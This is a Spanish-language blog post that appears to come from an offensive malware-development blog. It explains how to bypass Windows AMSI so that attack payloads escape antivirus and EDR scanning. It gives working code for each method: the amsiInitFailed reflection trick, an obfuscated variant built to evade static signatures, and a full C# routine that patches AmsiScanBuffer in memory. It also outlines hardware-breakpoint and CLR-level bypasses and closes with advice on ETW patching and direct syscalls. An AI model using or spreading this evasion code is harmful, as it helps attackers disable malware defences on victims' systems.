---
title: "AMSI Bypass: Técnicas Modernas para Operaciones Ofensivas"
date: 2025-10-08
tags:
  - evasion
  - amsi
  - maldev
  - windows
description: Un análisis profundo de las técnicas modernas para evadir AMSI — parcheo de memoria, hardware breakpoints y trucos a nivel CLR — con PoCs funcionales y explicación de por qué cada uno es detectado.
---

## Qué es AMSI y por qué importa

AMSI (Antimalware Scan Interface) es una API de Windows que permite a las aplicaciones solicitar un escaneo de contenido arbitrario contra el AV/EDR instalado localmente. PowerShell, .NET, VBScript y WSH pasan por él antes de ejecutarse. Cuando tu payload C2 activa AMSI, no obtienes ejecución — le das una alerta al defensor.

El objetivo de un bypass de AMSI es romper la interfaz **antes** de que tu contenido sea escaneado, no evadir las firmas del AV. Son problemas distintos.

---

## Clásico: parcheo de AmsiScanBuffer

La técnica más antigua y documentada. `AmsiScanBuffer` es la función en `amsi.dll` que realiza el escaneo real. Si sobrescribes sus primeros bytes con un `ret 0` o la fuerzas a retornar `AMSI_RESULT_CLEAN`, deja de escanear.

```csharp
// Enfoque de reflexión .NET en PowerShell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
  .GetField('amsiInitFailed','NonPublic,Static')
  .SetValue($null,$true)
```

Esta cadena específica está marcada por todos los EDR del planeta. En 2025 hay que ofuscarla. Enfoques comunes:

```powershell
# Split + concat para evitar firma estática
$a = 'System.Management.Automation.A'+'msiUtils'
$b = 'amsi'+'InitFailed'
[Ref].Assembly.GetType($a).GetField($b,'NonPublic,Static').SetValue($null,$true)
```

Incluso esto es detectado por análisis de comportamiento porque el patrón de reflexión es distintivo. Mejor ir directo al parcheo de memoria.

---

## Parcheo de memoria via P/Invoke

Más confiable. Parcheamos `AmsiScanBuffer` directamente en memoria:

```csharp
using System;
using System.Runtime.InteropServices;

class AmsiPatch {
    [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr h, string proc);
    [DllImport("kernel32")] static extern IntPtr LoadLibrary(string lib);
    [DllImport("kernel32")] static extern bool VirtualProtect(IntPtr addr, UIntPtr size, uint prot, out uint old);

    static void Patch() {
        IntPtr amsi = LoadLibrary("amsi.dll");
        IntPtr scan = GetProcAddress(amsi, "AmsiScanBuffer");

        // xor eax,eax; ret  — retorno 0
        byte[] patch = { 0x31, 0xC0, 0xC3 };

        uint old;
        VirtualProtect(scan, (UIntPtr)patch.Length, 0x40, out old);
        Marshal.Copy(patch, 0, scan, patch.Length);
        VirtualProtect(scan, (UIntPtr)patch.Length, old, out old);
    }
}
```

El problema: `AmsiScanBuffer` es un objetivo común de hooks de EDR. Muchos productos colocan su propio hook al inicio de esa función y monitorizan escrituras sobre ella. Parcheas la función, ellos detectan el parche.

---

## Hardware breakpoints (sin escrituras en memoria)

El enfoque más limpio. En vez de parchear memoria, registramos un hardware breakpoint sobre `AmsiScanBuffer` usando un vectored exception handler. Cuando se llama la función, tu handler se ejecuta primero y modifica el valor de retorno sin escribir jamás en la página ejecutable.

```csharp
// Concepto simplificado
// 1. Registrar VEH
// 2. DR0 = dirección de AmsiScanBuffer
// 3. DR7 habilitado con execute breakpoint
// 4. En el handler: RAX = AMSI_RESULT_CLEAN, avanzar RIP más allá del prólogo
```

Sin escrituras en páginas RX, sin llamadas a `VirtualProtect` — mucho más difícil de detectar via memory scanning. Esto es lo que implementan herramientas como `SharpBlock`.

---

## Nivel CLR: parchear el wrapper administrado

PowerShell específicamente pasa por el wrapper administrado del CLR antes de llegar a la API nativa de AMSI. El método administrado `AmsiUtils.ScanContent` es otro punto de parche:

```csharp
var utils = typeof(PSObject).Assembly.GetType("System.Management.Automation.AmsiUtils");
var method = utils.GetMethod("ScanContent", BindingFlags.NonPublic | BindingFlags.Static);
// Parchar el código nativo compilado por el JIT para ScanContent
```

La ventaja: estás parcheando el código nativo compilado de un método administrado, que está menos monitoreado que los exports de `amsi.dll`.

---

## Superficie de detección por técnica

| Técnica | AV estático | EDR Hooks | Memory Scan | Conductual |
|---|---|---|---|---|
| Reflexión (`amsiInitFailed`) | ✅ Detectado | Medio | Bajo | Medio |
| Parche memoria (P/Invoke) | Medio | ✅ Detectado | ✅ Detectado | Alto |
| Hardware breakpoint | Bajo | Bajo | ✅ Limpio | Medio |
| Parche CLR administrado | Bajo | Bajo | Bajo | Bajo |

---

## Qué funciona realmente en 2025

Ninguna técnica es confiable contra todos los EDR. Lo que importa:

1. **No usar cadenas conocidas** — ofuscar todo a nivel del loader
2. **Evitar `VirtualProtect` en páginas ejecutables** — es una secuencia de syscalls muy visible
3. **Combinar con parcheo de ETW** — `EtwEventWrite` en `ntdll.dll` es cómo la telemetría conductual llega al EDR
4. **Usar syscalls directas** — `NtWriteVirtualMemory` directo salta la mayoría de hooks en user-land

El juego real en 2025 son los kernel callbacks. Los bypasses de AMSI en user-land son cada vez menos relevantes contra productos que instrumentan a nivel de kernel. Eso es tema para otro post.

---

## Referencias

- [Internals de AMSI — Microsoft Docs](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)
- S-1-5-0 blog — técnica de hardware breakpoint
- Sektor7 MalDev Essentials
